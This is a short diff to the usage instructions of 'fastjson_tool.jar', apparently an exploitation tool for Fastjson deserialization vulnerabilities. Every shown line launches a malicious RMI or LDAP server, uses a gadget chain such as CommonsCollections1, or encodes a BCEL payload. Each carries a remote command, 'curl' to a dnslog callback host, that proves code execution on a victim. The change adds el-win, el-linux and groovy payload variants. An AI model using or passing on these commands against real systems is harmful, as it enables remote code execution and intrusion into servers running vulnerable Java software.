@@ -5,7 +5,7 @@ java -jar fastjson_tool.jar
 Usage:
 java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn" 
 java -cp fastjson_tool.jar fastjson.HLDAPServer 127.0.0.1 80 "curl dnslog.wyzxxz.cn"
-java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn" 
+java -cp fastjson_tool.jar fastjson.EvilRMIServer 8888 1099 "curl dnslog.wyzxxz.cn el-win/el-linux/groovy" 
 java -cp fastjson_tool.jar fastjson.LDAPRefServer2 1099  CommonsCollections1 "curl dnslog.cn"
 java -cp fastjson_tool.jar fastjson.BCELEncode "curl dnslog.wyzxxz.cn"
 
